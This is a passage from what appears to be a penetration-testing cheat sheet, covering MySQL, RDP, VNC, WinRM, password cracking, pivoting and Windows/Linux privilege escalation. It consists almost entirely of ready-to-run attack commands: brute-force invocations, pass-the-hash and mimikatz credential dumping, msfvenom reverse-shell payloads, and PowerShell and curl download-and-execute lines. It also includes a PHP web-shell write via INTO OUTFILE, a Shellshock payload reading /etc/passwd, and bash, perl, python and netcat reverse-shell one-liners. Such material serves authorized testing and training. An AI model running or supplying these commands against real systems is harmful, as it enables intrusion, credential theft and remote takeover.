grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```

### Connect

```
# Local
mysql -u <USER>
mysql -u <USER> -p

# Remote
mysql -h <IP> -u <USER>
```

### MySQL commands

```
show databases;
use <DATABASES>;

show tables;
describe <TABLE>;

select * from <TABLE>;

# Try to execute code
select do_system('id');
\! sh

# Read & Write
select load_file('<FILE>');
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
```

### Manual exploit

```
Cheatsheet :
	- https://www.asafety.fr/mysql-injection-cheat-sheet/
```

------

## RDP - 3389

### Brute force

```
crowbar -b rdp -s <IP>/CIDR -u <USER> -C <PASSWORDS_LIST>
crowbar -b rdp -s <IP>/CIDR -U <USERS_LIST> -C <PASSWORDS_LIST>

hydra -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP> -u -vV
```

### Connect with known credentials / hash

```
rdesktop -u <USERNAME> <IP>
rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD> <IP>

xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:<IP>
xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:<IP>
```

### Session stealing

#### Get openned sessions

```
query user
```

#### Access to the selected 

```
tscon <ID> /dest:<SESSIONNAME>
```

### Adding user to RDP group (Windows) 

```
net localgroup "Remote Desktop Users" <USER> /add
```

------

## VNC - 5800 - 58001 - 5900 - 5901

### Scans

``` 
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p <PORT> <IP>
```

### Brute force

```
hydra -L <USERS_LIST> –P <PASSWORDS_LIST> -s <PORT> <IP> vnc -u -vV
```

### Connect

```
vncviewer <IP>:<PORT>
```

### Found VNC password

#### Linux

```
Default password is stored in: ~/.vnc/passwd
```

#### Windows

```
# RealVNC
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver

# TightVNC
HKEY_CURRENT_USER\Software\TightVNC\Server

# TigerVNC
HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4

# UltraVNC
C:\Program Files\UltraVNC\ultravnc.ini
```

### Decrypt VNC password

```
msfconsole
irb
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt ["2151D3722874AD0C"].pack('H*'), fixedkey
/dev/nul
```

------

## WINRM - 5985 - 5986

### Brute force

```
crackmapexec winrm <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
```

### Connecting

```
evil-winrm -i <IP> -u <USER> -p <PASSWORD>
evil-winrm -i <IP> -u <USER> -H <HASH>
```

------

## CGI

### Found CGI scripts

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/CGI-XPlatform.fuzz.txt -u <URL>/ccgi-bin/FUZZ -t 50
ffuf -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -u <URL>/ccgi-bin/FUZZ -t 50
ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u <URL>/cgi-bin/FUZZ -e .sh,.pl,.cgi -t 100
```

If a script is found try [SHELLSHOCK](#shellshock).

------

## Command and control framework

```
# Download
git clone https://github.com/mhaskar/Octopus/tree/v1.2

# Install requirements
pip install -r requirements.txt

# Usage
./octopus.py

# Listener (exemple)
listen_http <BIND_IP> <BIND_PORT> <HOSTNAME> <INTERVAL_IN_SECONDS> <URL> <LISTENER_NAME>
listen_http 0.0.0.0 80 192.168.1.87 5 test.php listener_1

# Agent (exemple)
generate_powershell <LISTENER_NAME>
generate_powershell listener_1
```

------

## Compiling exploits

### For linux

```
# 64 bits
gcc -o exploit exploit.c

# 32 bits
gcc -m32 -o exploit exploit.c
```

### For windows

```
To compile Win32 bit executables, execute i686-w64-mingw32-gcc -o <FILE.exe> <FILE.c>
To compile Win64 bit executables, execute x86_64-w64-mingw32-gcc -o <FILE.exe><FILE.c>
To Compiled .cpp source file, execute i586-mingw32msvc-g++ -o <FILE>.exe <FILE>.cpp
To compile python scripts, pyinstaller --onefile <SCRIPT.py>

# Compile windows .exe on Linux
i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
```

### Cross compile

```
gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c
```

------

## DICTIONARY GENERATION

```
cewl -m <WORDS_SIZE> --with-numbers -w dictiFromWebsite <URL> -d <DEPTH>
```

```
crunch 5 5 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -t Test@ -o passwords.txt
```

------

## FILE TRANSFER

### Linux

```
# PYTHON
python -m SimpleHTTPServer <PORT>
python2.7 -c "from urllib import urlretrieve; urlretrieve('<URL>', '<DESTINATION_FILE>')"

# FTP
sudo python3 -m pyftpdlib  -p 21 -w

# SMB
sudo smbserver.py -smb2support liodeus .

# WGET
wget <URL> -o <OUT_FILE>

# CURL
curl <URL> -o <OUT_FILE>

# NETCAT
nc -lvp 1234 > <OUT_FILE> 
nc <IP> 1234 < <IN_FILE> 

# SCP
scp <SOURCE_FILE> <USER>@<IP>:<DESTINATION_FILE>
```

### Windows

```
# FTP 
echo open <IP> 21 > ftp.txt echo anonymous>> ftp.txt echo password>> ftp.txt echo binary>> ftp.txt echo GET <FILE> >> ftp.txt echo bye>> ftp.txt
ftp -v -n -s:ftp.txt

# SMB
copy \\<IP>\<PATH>\<FILE> # Linux -> Windows
copy <FILE> \\<IP>\<PATH>\ # Windows -> Linux

# Powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('<URL>', '<DESTINATION_FILE>')
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('<URL>')
powershell "wget <URL>"

# Python
python.exe -c "from urllib import urlretrieve; urlretrieve('<URL>', '<DESTINATION_FILE>')"

# CertUtil
certutil.exe -urlcache -split -f "<URL>"

# NETCAT
nc -lvp 1234 > <OUT_FILE> 
nc <IP> 1234 < <IN_FILE>

# CURL
curl <URL> -o <OUT_FILE>
```

------

## GIT

### Download .git 

```
mkdir <DESTINATION_FOLDER>
./gitdumper.sh <URL>/.git/ <DESTINATION_FOLDER>
```

### Extract .git content

```
mkdir <EXTRACT_FOLDER>
./extractor.sh <DESTINATION_FOLDER> <EXTRACT_FOLDER>
```

------

## HASHES

### Get hashes 
```

```

### Pass the hash
```
# Login as user only with hashdump
# From this hashdump
# admin2:1000:aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7:::
```
```
## CRACK MAP EXEC

crackmapexec smb 192.168.68.122-126 -u fcastle -d MARVEL.local -H <NTLM Hash> --local-auth # Check other machines for dual access with the same hash; --sam (dump SAM file)

crackmapexec smb 192.168.68.122-126 -u fcastle -d MARVEL.local -p <P@ssw0rd1>
```
```## PSEXEC

psexec.py "frank castle":@192.168.68.122 -hashes aad3b435b51404eeaad3b435b51404ee:ae974876d974abd805a989ebead86846 # attempt to gain a shell
```
```
## Pth-Winexe

pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb //10.11.1.24 cmd
```
```
##Evil-Winrm

evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'

evil-winrm  -i 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:ae974876d974abd805a989ebead86846 -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
```
```
## Impacket-PSexec:

python3 /usr/share/impacket/impacket/examples/psexec.py "Administrator":@10.11.1.121 -hashes aad3b435b51404eeaad3b435b51404ee:57321e6a0eef2c45985c9fa49c5cd24f 
```

### Windows

```
reg save HKLM\SAM c:\SAM
reg save HKLM\System c:\System

samdump2 System SAM > hashes
```

### Linux

```
unshadow passwd shadow > hashes
```

------

## MIMIKATZ

```
privilege::debug
```

```
sekurlsa::logonpasswords
sekurlsa::tickets /export

kerberos::list /export

vault::cred
vault::list

lsadump::sam
lsadump::secrets
lsadump::cache
```

------

## MISCELLANEOUS

### Get a Windows path without spaces

```
# path.cmd
@echo off
echo %~s1

path.cmd "C:\Program Files (x86)\Common Files\test.txt"
C:\PROGRA~2\COMMON~1\test.txt -> Valid path without spaces
```

------

## MSFVENOM PAYLOAD

### Linux

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

### Windows

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

### PHP

```
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php

Then we need to add the <?php at the first line of the file so that it will execute as a PHP webpage
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

### ASP

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

### JSP

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
```

### WAR

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
```

### Python

```
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py
```

### Bash

```
msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh
```

### Perl

```
msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl
```

### Listener

#### Metasploit

```
use exploit/multi/handler
set PAYLOAD <PAYLOAD>
set LHOST <LHOST>
set LPORT <LPORT>
set ExitOnSession false
exploit -j -z
```

#### Netcat

```
nc -lvp <PORT>
```

------

## PASSWORD CRACKING

### Online

```
Decrypt MD5, SHA1, MySQL, NTLM, SHA256, SHA512 hashes
https://hashes.com/en/decrypt/hash
```
### Hydra
```
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt x.x.x.x http-post-form "LOGINPAGE:username=admin&password=^PASS^:Invalid Password!"
#Change http-post-form to http-get-form for get or post 
# -l = User
```
### Hashcat

#### Linux password

```
hashcat -m 1800 -a 0 hash.txt rockyou.txt
hashcat -m 1800 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule
```

#### Windows password

```
hashcat -m 1000 -a 0 hash.txt rockyou.txt
hashcat -m 1000 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule
```

#### Others

```
hashcat --example-hashes | grep -i '<BEGINNING_OF_HASH>'
```

#### Rules

```
https://github.com/NotSoSecure/password_cracking_rules
```

### John

```
john --wordlist=<PASSWORDS_LIST> hash.txt
```

------

## PIVOTING

### Sshuttle

```
sshuttle <USER>@<IP> <IP_OF_THE_INTERFACE>/CIDR
```

### Proxychains

```
ssh -f -N -D 9050 <USER>@<IP>
proxychains <COMMAND>
```

### Interesting link

```
https://artkond.com/2017/03/23/pivoting-guide/
```

------

## PRIVILE ESCALATION

### Linux

#### Enumeration scripts

``` 
bash LinEnum.sh
bash lse.sh -l 1
bash linpeas.sh
python linuxprivchecker.py
./unix-privesc-check standard
```

## Enum users using enum4linux
replace 'hostname' with target . Creates file containing found usernames

```
(echo; enum4linux -U hostname|grep user:|cut -d\[ -f2|cut -d\] -f1) >
/home/kali/Desktop/users.txt
```

## LinPEAS
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

```
# From github
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Local network
sudo python -m SimpleHTTPServer 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim

# Output to file
./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
less -r /dev/shm/linpeas.txt #Read with colors

# Use a linpeas binary
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64
```
-------
#### Vulnerability scan

```
perl les2.pl
bash les.sh
```

#### Suid checker

```
python suid3num.py

https://gtfobins.github.io/
```

#### Methodology to follow

```
https://guif.re/linuxeop
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
```

```
sudo -l
Kernel Exploits
OS Exploits
Password reuse (mysql, .bash_history, 000- default.conf...)
Known binaries with suid flag and interactive (nmap)
Custom binaries with suid flag either using other binaries or with command execution
Writable files owned by root that get executed (cronjobs)
MySQL as root
Vulnerable services (chkrootkit, logrotate)
Writable /etc/passwd
Readable .bash_history
SSH private key
Listening ports on localhost
/etc/fstab
/etc/exports
/var/mail
Process as other user (root) executing something you have permissions to modify
SSH public key + Predictable PRNG
apt update hooking (PreInvoke)
```

### Windows

#### Enumeration scripts

##### General scans

```
winPEAS.exe
windows-privesc-check2.exe
Seatbelt.exe -group=all
powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
Powerless.bat
winPEAS.bat
```

##### Search for CVE

```
systeminfo > systeminfo.txt
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database <DATE>-mssb.xlsx --systeminfo systeminfo.txt

systeminfo > systeminfo.txt
wmic qfe > qfe.txt
python wes.py -u
python wes.py systeminfo.txt qfe.txt

powershell -exec bypass -command "& { Import-Module .\Sherlock.ps1; Find-AllVulns; }"
```

##### Post exploitation

```
lazagne.exe all
SharpWeb.exe
mimikatz.exe
```

#### JuicyPotato (SeImpersonate or SeAssignPrimaryToken)

```
If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM.

JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe <IP> <PORT> -e c:\windows\system32\cmd.exe" -t *
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe <IP> <PORT> -e c:\windows\system32\cmd.exe" -t * -c <CLSID>

# CLSID
https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
```

#### Methodology to follow

```
https://guif.re/windowseop
https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
https://mysecurityjournal.blogspot.com/p/client-side-attacks.html
http://www.fuzzysecurity.com/tutorials/16.html
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
```

#### Autorun

##### Detection

```
powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

[*] Checking for modifiable registry autoruns and configs...

Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
Path           : "C:\Program Files\Autorun Program\program.exe"
ModifiableFile : @{Permissions=System.Object[]; ModifiablePath=C:\Program Files\Autorun Program\program.exe; IdentityReference=Everyone}
```

or

```
winPEAS.exe

[+] Autorun Applications(T1010)
    Folder: C:\Program Files\Autorun Program
    File: C:\Program Files\Autorun Program\program.exe
    FilePerms: Everyone [AllAccess]
```

##### Exploitation

```
# Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
sudo python -m SimpleHTTPServer 80
sudo nc -lvp <PORT>

# Victim
cd C:\Program Files\Autorun Program\
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', '.\program.exe')

To execute it with elevated privileges we need to wait for someone in the Admin group to login.
```

#### AlwaysInstallElevated

##### Detection

```
powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

[*] Checking for AlwaysInstallElevated registry key...

AbuseFunction : Write-UserAddMSI
```

or

```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

If both values are equal to 1 then it's vulnerable.
```

or

```
winPEAS.exe

[+] Checking AlwaysInstallElevated(T1012)

  AlwaysInstallElevated set to 1 in HKLM!
  AlwaysInstallElevated set to 1 in HKCU!
```

##### Exploitation

```
# Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > program.msi
sudo python -m SimpleHTTPServer 80
sudo nc -lvp <PORT>

# Victim
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.msi', 'C:\Temp\program.msi')
msiexec /quiet /qn /i C:\Temp\program.msi
```

#### Executable Files

##### Detection

```
powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

[*] Checking service executable and argument permissions...

ServiceName                     : filepermsvc
Path                            : "C:\Program Files\File Permissions Service\filepermservice.exe"
ModifiableFile                  : C:\Program Files\File Permissions Service\filepermservice.exe
ModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Traverse, DeleteChild...}
ModifiableFileIdentityReference : Everyone
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'
CanRestart                      : True
```

or

```
winPEAS.exe

[+] Interesting Services -non Microsoft-(T1007)

filepermsvc(Apache Software Foundation - File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
	File Permissions: Everyone [AllAccess]
```

##### Exploitation

```
# Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
sudo python -m SimpleHTTPServer 80
sudo nc -lvp <PORT>

# Victim
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', 'C:\Temp\program.exe')
copy /y c:\Temp\program.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
sc start filepermsvc
```

#### Startup applications

##### Detection

```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

C:\>icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)
                                                             TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
                                                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                                             BUILTIN\Administrators:(I)(OI)(CI)(F)
                                                             BUILTIN\Users:(I)(OI)(CI)(RX)
                                                             Everyone:(I)(OI)(CI)(RX)

If the user you're connecte with has full access ‘(F)’ to the directory (here Users) then it's vulnerable.
```

##### Exploitation

```
# Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
sudo python -m SimpleHTTPServer 80
sudo nc -lvp <PORT>

# Victim
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', '.\program.exe')

To execute it with elevated privileges we need to wait for someone in the Admin group to login.
```

#### Weak service permission 

##### Detection

```
# Find all services authenticated users have modify access onto
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

if SERVICE_ALL_ACCESS then vulnerable

# Find all weak folder permissions per drive.
accesschk.exe /accepteula -uwdqs Users c:\
accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\

# Find all weak file permissions per drive.
accesschk.exe /accepteula -uwqs Users c:\*.*
accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*
```

or

```
powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

[*] Checking service permissions...

ServiceName   : daclsvc
Path          : "C:\Program Files\DACL Service\daclservice.exe"
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'daclsvc'
CanRestart    : True
```

or

```
winPEAS.exe

[+] Interesting Services -non Microsoft-(T1007)

daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
	YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles

[+] Modifiable Services(T1007)
	LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
	daclsvc: WriteData/CreateFiles
```

##### Exploitation

```
# Attacker
sudo python -m SimpleHTTPServer 80
sudo nc -lvp <PORT>

# Victim
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe', '.\nc.exe')
sc config <SERVICENAME> binpath= "<PATH>\nc.exe <IP> <PORT> -e cmd.exe"
sc start <SERVICENAME>
or 
net start <SERVICENAME>
```

#### Unquoted service paths

##### Detection

```
powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

[*] Checking for unquoted service paths...

ServiceName    : unquotedsvc
Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
ModifiablePath : @{Permissions=AppendData/AddSubdirectory; ModifiablePath=C:\;IdentityReference=NT AUTHORITY\Authenticated Users}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
CanRestart     : True

ServiceName    : unquotedsvc
Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
ModifiablePath : @{Permissions=System.Object[]; ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
CanRestart     : True
```

or

```
winPEAS.exe

[+] Interesting Services -non Microsoft-(T1007)

unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected
```

##### Exploitation

```
# Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > Common.exe
sudo python -m SimpleHTTPServer 80
sudo nc -lvp <PORT>

# Victim
cd "C:\Program Files\Unquoted Path Service\"
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Common.exe', '.\Common.exe')
sc start unquotedsvc
```

#### Hot potato

##### Exploitation

```
# Attacker
sudo python -m SimpleHTTPServer 80
sudo nc -lvp <PORT>

# Victim
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe', '.\nc.exe')
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Tater.ps1.exe', '.\Tater.ps1.exe')
powershell -exec bypass -command "& { Import-Module .\Tater.ps1; Invoke-Tater -Trigger 1 -Command '.\nc.exe <IP> <PORT> -e cmd.exe' }"
```

#### CVE

```
# Already compiled exploit
https://github.com/SecWiki/windows-kernel-exploits
https://github.com/abatchy17/WindowsExploits
```

##### Windows XP

|      CVE      | Description                                                  |
| :-----------: | :----------------------------------------------------------- |
| CVE-2002-1214 | ms02_063_pptp_dos - exploits a kernel based overflow when sending abnormal PPTP Control Data packets - code execution, DoS |
| CVE-2003-0352 | ms03_026_dcom - exploits a stack buffer overflow in the RPCSS service |
| CVE-2003-0533 | MS04-011 - ms04_011_lsass - exploits a stack buffer overflow in the LSASS service |
| CVE-2003-0719 | ms04_011_pct - exploits a buffer overflow in the Microsoft Windows SSL PCT protocol stack - Private communication target overflow |
| CVE-2003-0812 | ms03_049_netapi - exploits a stack buffer overflow in the NetApi32 |
| CVE-2003-0818 | ms04_007_killbill -  vulnerability in the bit string decoding code in the Microsoft ASN.1 library |
| CVE-2003-0822 | ms03_051_fp30reg_chunked - exploit for the chunked encoding buffer overflow described in MS03-051 |
| CVE-2004-0206 | ms04_031_netdde - exploits a stack buffer overflow in the NetDDE service |
| CVE-2010-3138 | EXPLOIT-DB 14765 - Untrusted search path vulnerability - allows local users to gain privileges via a Trojan horse |
| CVE-2010-3147 | EXPLOIT-DB 14745 - Untrusted search path vulnerability in wab.exe - allows local users to gain privileges via a Trojan horse |
| CVE-2010-3970 | ms11_006_createsizeddibsection - exploits a stack-based buffer overflow in thumbnails within .MIC files - code execution |
| CVE-2011-1345 | Internet Explorer does not properly handle objects in memory - allows remote execution of code via object |
| CVE-2011-5046 | EXPLOIT-DB 18275 - GDI in windows does not properly validate user-mode input - allows remote code execution |
| CVE-2012-4349 | Unquoted windows search path - Windows provides the capability of including spaces in path names - can be root |

##### Windows 7

|      CVE      | Description                                                  |
| :-----------: | :----------------------------------------------------------- |
| CVE-2010-0232 | ms10_015_kitrap0d - create a new session with SYSTEM privileges via the KiTrap0D exploit |
| CVE-2010-2568 | ms10_046_shortcut_icon_dllloader - exploits a vulnerability in the handling of Windows Shortcut files (.LNK) - run a payload |
| CVE-2010-2744 | EXPLOIT-DB 15894 - kernel-mode drivers in windows do not properly manage a window class - allows privileges escalation |
| CVE-2010-3227 | EXPLOIT-DB - Stack-based buffer overflow in the UpdateFrameTitleForDocument method - arbitrary code execution |
| CVE-2014-4113 | ms14_058_track_popup_menu - exploits a NULL Pointer Dereference in win32k.sys - arbitrary code execution |
| CVE-2014-4114 | ms14_060_sandworm - exploits a vulnerability found in Windows Object Linking and Embedding - arbitrary code execution |
| CVE-2015-0016 | ms15_004_tswbproxy -  abuses a process creation policy in Internet Explorer's sandbox - code execution |
| CVE-2018-8494 | remote code execution vulnerability exists when the Microsoft XML Core Services MSXML parser processes user input |

##### Windows 8

|      CVE      | Description                                                  |
| :-----------: | ------------------------------------------------------------ |
| CVE-2013-0008 | ms13_005_hwnd_broadcast - attacker can broadcast commands from lower Integrity Level process to a higher one - privilege escalation |
| CVE-2013-1300 | ms13_053_schlamperei - kernel pool overflow in Win32k - local privilege escalation |
| CVE-2013-3660 | ppr_flatten_rec - exploits EPATHOBJ::pprFlattenRec due to the usage of uninitialized data - allows memory corruption |
| CVE-2013-3918 | ms13_090_cardspacesigninhelper - exploits CardSpaceClaimCollection class from the icardie.dll ActiveX control - code execution |
| CVE-2013-7331 | ms14_052_xmldom - uses Microsoft XMLDOM object to enumerate a remote machine's filenames |
| CVE-2014-6324 | ms14_068_kerberos_checksum - exploits the Microsoft Kerberos implementation - privilege escalation |
| CVE-2014-6332 | ms14_064_ole_code_execution -  exploits the Windows OLE Automation array vulnerability |
| CVE-2014-6352 | ms14_064_packager_python - exploits Windows Object Linking and Embedding (OLE) - arbitrary code execution |
| CVE-2015-0002 | ntapphelpcachecontrol - NtApphelpCacheControl Improper Authorization Check - privilege escalation |

##### Windows 10

|      CVE      | Description                                                  |
| :-----------: | ------------------------------------------------------------ |
| CVE-2015-0057 | exploits GUI component of Windows namely the scrollbar element - allows complete control of a Windows machine |
| CVE-2015-1769 | MS15-085 - Vulnerability in Mount Manager - Could Allow Elevation of Privilege |
| CVE-2015-2426 | ms15_078_atmfd_bof MS15-078 - exploits a pool based buffer overflow in the atmfd.dll driver |
| CVE-2015-2479 | MS15-092 - Vulnerabilities in .NET Framework - Allows Elevation of Privilege |
| CVE-2015-2513 | MS15-098 - Vulnerabilities in Windows Journal - Could Allow Remote Code Execution |
| CVE-2015-2423 | MS15-088 - Unsafe Command Line Parameter Passing - Could Allow Information Disclosure |
| CVE-2015-2431 | MS15-080 - Vulnerabilities in Microsoft Graphics Component - Could Allow Remote Code Execution |
| CVE-2015-2441 | MS15-091 - Vulnerabilities exist when Microsoft Edge improperly accesses objects in memory - allows remote code execution |

##### Windows Server 2003

|      CVE      | Description                                                  |
| :-----------: | ------------------------------------------------------------ |
| CVE-2008-4250 | ms08_067_netapi  - exploits a parsing flaw in the path canonicalization code of NetAPI32.dll - bypassing NX |
| CVE-2017-8487 | allows an attacker to execute code when a victim opens a specially crafted file - remote code execution |

------

## PROOFS

### Linux

```
echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo " "
```

### Windows

```
echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
```

------

## REVERSE SHELL

### Amazing tool for shell generation

```
# Download
git clone https://github.com/ShutdownRepo/shellerator

# Install requirements
pip3 install --user -r requirements.txt

# Executable from anywhere
sudo cp shellrator.py /bin/shellrator
```

### Bash

```
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

### Perl

```
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Netcat

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
```

### More reverse shell

```
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
```

### Interactive shell

```
# Python
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Bash
echo os.system('/bin/bash')

# Sh
/bin/bash -i

# Perl
perl -e 'exec "/bin/bash"'

# Ruby
exec "/bin/bash"

# Lua
os.execute('/bin/bash')
```

### Adjust Interactive shell

```
stty size # Find your terminal size -> 50 235
Ctrl-Z
stty raw -echo  // Disable shell echo
fg
export SHELL=bash
export TERM=xterm OR export TERM=xterm-256color
stty rows 50 columns 235
```

------

## SHELLSHOCK

```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" <URL>/cgi-bin/<SCRIPT>
```

------

## USEFUL LINUX COMMANDS

### Find a file

```
locate <FILE>
find / -name "<FILE>"
```

### Active connection

```
